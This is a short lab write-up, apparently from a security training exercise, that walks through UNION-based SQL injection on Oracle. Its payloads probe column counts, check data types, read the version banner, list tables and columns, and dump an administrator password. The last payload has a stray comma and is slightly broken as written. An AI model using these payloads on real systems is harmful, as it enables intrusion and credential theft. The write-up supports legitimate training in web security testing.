Lab: SQL injection attack, listing the database contents on Oracle

Goals
 - Determine the table that contains usernames and passwords
 - Determin the relevant columns
 - Login as the admin user

Analysis:
 ----------
 1. Find the number of columns
    ' order by 2-- >> 200
    ' order by 3-- >> 500
    Using 2 columns
 On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 
2. Find the data type of the columns
    ' union select 'a', 'a' from all_tables-- >> 200
    ' union select 'a', 'a' from dual-- >> 200
    Both columns accept strings

3. Determine version of database
    ' union select null, banner from v$version--
    CORE	11.2.0.2.0	Production
    NLSRTL Version 11.2.0.2.0 - Production
    Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
    PL/SQL Release 11.2.0.2.0 - Production
    TNS for Linux: Version 11.2.0.2.0 - Production

4. Output list of table names in the database
    ' union select owner, table_name from all_tables--
    Found >> USERS_COOTLL

5. Output column names from the selected table
    ' union select column_name, null from all_tab_columns where table_name='USERS_COOTLL'--
    Found >> USERNAME_STRAHH, PASSWORD_ZOOHUI

6. Output usernames and passwords from columns
    ' union select USERNAME_STRAHH, PASSWORD_ZOOHUI, from USERS_COOTLL--
    Found >> administrator: wyimt8ict2kolft9gv9j
